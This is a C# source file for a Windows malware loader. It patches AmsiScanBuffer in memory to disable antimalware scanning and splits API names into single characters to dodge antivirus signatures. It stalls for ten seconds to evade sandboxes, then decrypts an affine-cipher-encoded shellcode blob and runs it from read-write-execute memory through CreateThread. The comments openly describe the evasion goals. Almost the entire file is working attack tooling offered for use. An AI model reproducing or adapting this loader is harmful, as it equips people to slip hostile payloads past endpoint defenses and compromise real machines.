using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;



// In a real-world situation I'd remove all the comments & whitespace to have as small of a payload as possible


class AffineCipher
{

    [DllImport("kernel32.dll", SetLastError = false)] // Disable setlasterror to false to reduce noise
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = false, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma( // Can we find a BETTER non-emulated api here 
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect,
        uint nndPreferred
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread( // Can we find a non-emulated api here as well? 
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject( // Can we find a non-emulated api here as well? 
        IntPtr hHandle,
        uint dwMilliseconds
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);


public static void Patch()
{
    // Obfuscate strings to avoid static AV signature detection
    string dll = string.Concat("a", "m", "s", "i", ".", "d", "l", "l");
    string func = string.Concat("A", "m", "s", "i", "S", "c", "a", "n", "B", "u", "f", "f", "e", "r");

    IntPtr hModule = LoadLibrary(dll);
    IntPtr procAddress = GetProcAddress(hModule, func);

    uint oldProtect;
    VirtualProtect(procAddress, (UIntPtr)6, 0x40, out oldProtect); // PAGE_EXECUTE_READWRITE

    // Patch bytes: mov eax,0x80070057; ret
    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    Marshal.Copy(patch, 0, procAddress, patch.Length);

    VirtualProtect(procAddress, (UIntPtr)6, oldProtect, out _);
}


    static void Main()
    {
        Console.WriteLine("[*] Affine loader starting…");
        
        
        Patch();    
        Console.WriteLine("[*] AMSI patched");
        
        var sw = Stopwatch.StartNew();
        


        while (sw.ElapsedMilliseconds < 10000) {} // Sleep to try to evade sandbox detection
        
        byte[] encrypted = new byte[] { 0xf7, 0xa8, 0x93, 0x27, 0x44, 0xb6, 0xb6, 0xf7, 0xd8, 0xb0, 0x6c, 0xf7, 0xe2, 0x68, 0x4f, 0xf7, 0xe2, 0x2f, 0x47, 0xf7, 0xe2, 0xdf, 0x0f, 0xf7, 0x74, 0xf7, 0x55, 0xf7, 0x74, 0xf7, 0xe2, 0x87, 0x0f, 0x30, 0x70, 0x07, 0xe2, 0x32, 0x4b, 0xdb, 0x28, 0x5a, 0x14, 0xd8, 0xb3, 0x30, 0xa8, 0x93, 0xb6, 0xb6, 0xc6, 0xb7, 0x30, 0xe8, 0x7b, 0x63, 0xa1, 0xe2, 0x63, 0xba, 0xdb, 0x28, 0x21, 0x13, 0xe2, 0x31, 0x63, 0x14, 0xd8, 0xb2, 0x13, 0xe2, 0xf9, 0x0f, 0x14, 0x28, 0x5a, 0xdb, 0x70, 0x78, 0xde, 0x7a, 0x2b, 0xd8, 0xb2, 0x68, 0xe2, 0x6b, 0xe2, 0xd3, 0xdb, 0x28, 0x5a, 0xf7, 0xb6, 0xb0, 0xf7, 0xe7, 0xbe, 0x6c, 0xc3, 0xbf, 0x51, 0xa6, 0xfa, 0x68, 0xf7, 0xa0, 0x9a, 0xfc, 0x08, 0x14, 0xd8, 0xb2, 0x13, 0xe2, 0xf9, 0xf3, 0x14, 0x28, 0x5a, 0xf7, 0xb6, 0xe8, 0xa5, 0x4c, 0xe2, 0xbb, 0xa2, 0x14, 0xd8, 0xb2, 0x13, 0xe2, 0xf9, 0x2b, 0x14, 0x28, 0x5a, 0xda, 0xe2, 0x13, 0x02, 0xd3, 0xdb, 0x28, 0xaf, 0x30, 0x70, 0x05, 0xf7, 0x3e, 0xe8, 0x88, 0x51, 0xe0, 0x68, 0xf8, 0xf7, 0x20, 0xdb, 0xa6, 0x88, 0x33, 0xdb, 0x50, 0xc1, 0x51, 0xf8, 0xf7, 0x70, 0x41, 0xdb, 0x70, 0xe8, 0xf7, 0x1a, 0x7b, 0x9f, 0x68, 0xb6, 0x95, 0xf7, 0x1a, 0x93, 0x9f, 0xf7, 0x1a, 0x93, 0x7f, 0xf7, 0x70, 0x05, 0xf7, 0xd8, 0xaf, 0xf7, 0x3e, 0xaf, 0xfb, 0xfb, 0xef, 0xef, 0xbf, 0xf7, 0xe7, 0x4e, 0x6a, 0x11, 0x16, 0x4a, 0x11, 0x2d, 0x33, 0xbf, 0xf7, 0x70, 0x08, 0xf7, 0x1a, 0x7b, 0x9f, 0xb6, 0x95, 0x30, 0x70, 0x3e, 0xf7, 0x1a, 0x93, 0x9f, 0xf7, 0x1a, 0x93, 0x7f, 0xf7, 0x3e, 0xaf, 0xfc, 0xdf, 0xef, 0xef, 0xbf, 0xf7, 0xe7, 0x4e, 0x6a, 0x68, 0x6a, 0xc3, 0x88, 0x51, 0xc3, 0xbf, 0xf7, 0x70, 0x41, 0xdb, 0x70, 0x60, 0xf7, 0x1a, 0x7b, 0x9f, 0x68, 0xb6, 0x95, 0xf7, 0x1a, 0x93, 0x9f, 0xf7, 0x1a, 0x93, 0x7f, 0x30, 0x70, 0x93, 0xf7, 0xd8, 0xb0, 0xa5, 0x20, 0xc7, 0x28, 0xf7, 0x10, 0x5b, 0xf7, 0x54, 0x63, 0xf3, 0xa5, 0x20, 0x61, 0x61, 0xf7, 0x1a, 0x7b, 0x87, 0x68, 0xb6, 0x23, 0xf7, 0x3e, 0xaf, 0xc3, 0x68, 0xef, 0xef, 0xbf, 0xf7, 0xe7, 0x4e, 0x6a, 0x68, 0x6a, 0xa6, 0xfa, 0xc2, 0x6c, 0xbf, 0xf7, 0x70, 0x41, 0xdb, 0x70, 0x60, 0xf7, 0x1a, 0x7b, 0x9f, 0x68, 0xb6, 0x95, 0xf7, 0x1a, 0x93, 0x9f, 0xf7, 0x1a, 0x93, 0x7f, 0x30, 0x70, 0x93, 0xf7, 0xa8, 0x7b, 0xb7, 0x61, 0xef, 0xef, 0xf7, 0xd8, 0xb1, 0xf7, 0x1a, 0x7b, 0x87, 0xf7, 0x70, 0xa3, 0xf3, 0x0f, 0xf7, 0x70, 0xa3, 0xf3, 0xd7, 0xf7, 0xb6, 0x21, 0xf7, 0x70, 0x78, 0xf7, 0xb6, 0xe8, 0x14, 0xd8, 0xaf, 0x30, 0x1a, 0xaf, 0x45, 0x14, 0xd8, 0xb0, 0xa5, 0x68, 0x20, 0x37, 0x28, 0xda, 0xe2, 0x2b, 0x46, 0x14, 0xd8, 0xb0, 0x68, 0xb6, 0x23, 0x30, 0x70, 0xcc, 0xf7, 0xa8, 0x93, 0xb7, 0x61, 0xef, 0xef, 0xf7, 0x3e, 0xaf, 0xfa, 0xc3, 0xef, 0xef, 0xbf, 0xf7, 0xe7, 0x4e, 0x6a, 0x68, 0xda, 0xa6, 0x6d, 0x6d, 0x6c, 0xbf, 0xf7, 0x70, 0x41, 0xdb, 0x70, 0x60, 0xf7, 0x1a, 0x7b, 0x9f, 0x68, 0xb6, 0x95, 0xf7, 0x1a, 0x93, 0x9f, 0xf7, 0x1a, 0x93, 0x7f, 0x30, 0x70, 0x93, 0xdb, 0x70, 0xd0, 0xf7, 0xa8, 0x7b, 0xb7, 0x61, 0xef, 0xef, 0xf7, 0xd8, 0xaf, 0xf7, 0xb6, 0xaf, 0xf7, 0xb6, 0xaf, 0xf7, 0x70, 0xd3, 0xf3, 0xf7, 0x3e, 0xaf, 0xba, 0x10, 0xef, 0xef, 0xf7, 0x70, 0x13, 0xf3, 0x61, 0xf7, 0xe7, 0xaf, 0x57, 0x28, 0x43, 0xef, 0xef, 0xef, 0xef, 0xf7, 0x70, 0x13, 0xf3, 0xd3, 0xf7, 0x54, 0x63, 0xf3, 0x30, 0x3e, 0xaf, 0xd5, 0xef, 0xef, 0xef, 0x14, 0xd8, 0xb0, 0x68, 0xf8, 0x68, 0xf8, 0x68, 0xf8, 0xf7, 0xa8, 0x7b, 0x37, 0xef, 0xef, 0xef, 0x68, 0xb6, 0x23, 0xf7, 0xd8, 0xb0, 0x6c, 0xf7, 0xe2, 0x68, 0x4f, 0xf7, 0xe2, 0x2f, 0x47, 0xf7, 0xe2, 0xdf, 0x0f, 0xf7, 0x74, 0xf7, 0x55, 0xf7, 0x74, 0xf7, 0xe2, 0x87, 0x0f, 0x30, 0x70, 0x07, 0xf7, 0xe7, 0xa6, 0xfa, 0x6c, 0x8a, 0x8a, 0x68, 0xef, 0xef, 0xbf, 0xf7, 0xe7, 0xda, 0x51, 0x6c, 0x88, 0xc3, 0x6c, 0xbf, 0x51, 0xbf, 0xf7, 0x70, 0x41, 0xdb, 0x70, 0xe8, 0xf7, 0x1a, 0x7b, 0x9f, 0x68, 0xb6, 0x95, 0xf7, 0x1a, 0x93, 0x9f, 0xf7, 0x1a, 0x93, 0x7f, 0x30, 0x70, 0x93, 0xf7, 0xe7, 0xfa, 0x34, 0x33, 0x2d, 0x6c, 0xa7, 0x6c, 0xef, 0xbf, 0xf7, 0x70, 0x08, 0x68, 0xdc, 0x68, 0xdc, 0x68, 0xdc, 0xf7, 0xd8, 0xaf, 0xa5, 0xbf, 0xbf, 0xbf, 0xf7, 0x3e, 0xaf, 0xef, 0x28, 0xef, 0xef, 0xa5, 0xbf, 0xf7, 0xd8, 0xaf, 0xa5, 0xbf, 0xa5, 0xbf, 0xbf, 0xbf, 0xbf, 0xbf, 0xbf, 0xbf, 0xf7, 0x3e, 0xaf, 0x17, 0xef, 0xef, 0xef, 0xbf, 0xf7, 0x70, 0x5e, 0xf7, 0x70, 0xcf, 0xf7, 0xf4, 0xef, 0x0c, 0xef, 0xef, 0xbf, 0x4e, 0xf7, 0xd8, 0xaf, 0xbf, 0xbf, 0xbf, 0xf7, 0xb6, 0xaf, 0xbf, 0xf7, 0xd8, 0xaf, 0xbf, 0xbf, 0xbf, 0xbf, 0x30, 0x70, 0xaf, 0x30, 0x70, 0xe8, 0xf7, 0x70, 0xe9, 0xf7, 0x70, 0xe8, 0x68, 0xb6, 0x23 };
        
        // Affine keys ( Could base64 obfuscate, obfustace with math, etc... )
        int a_inv = 9;
        int b = 239;

        // Decrypting in memory
        var type = typeof(ObfuscationUtils);
        var method = type.GetMethod("Decrypt");
        byte[] buf = (byte[])method.Invoke(null, new object[] { encrypted, a_inv, b });

        Console.WriteLine($"[*] Decrypted {buf.Length} bytes; first few bytes: {buf[0]:X2} {buf[1]:X2}");

        int size = buf.Length;


        // Allocate memory using VirtualAllocExNuma
        IntPtr procHandle = GetCurrentProcess();
        IntPtr addr = VirtualAllocExNuma(procHandle, IntPtr.Zero, (uint)size, 0x3000, 0x40, 0);
        Console.WriteLine($"[*] RWX memory allocated at 0x{addr.ToInt64():X}");


        Marshal.Copy(buf, 0, addr, size);
        Console.WriteLine("[*] Shellcode copied");

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        Console.WriteLine($"[*] CreateThread returned 0x{hThread.ToInt64():X}");
        Console.WriteLine("[*] Waiting on thread…");
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        Console.WriteLine("[*] Done (should never reach here)");
    }
}

public static class ObfuscationUtils
{
    public static byte[] Decrypt(byte[] input, int a_inv, int b)
    {
        byte[] result = new byte[input.Length];
        for (int i = 0; i < input.Length; i++)
        {
            int temp = a_inv * (input[i] - b);
            result[i] = (byte)((temp + 256 * 3) % 256);
        }
        return result;
    }
}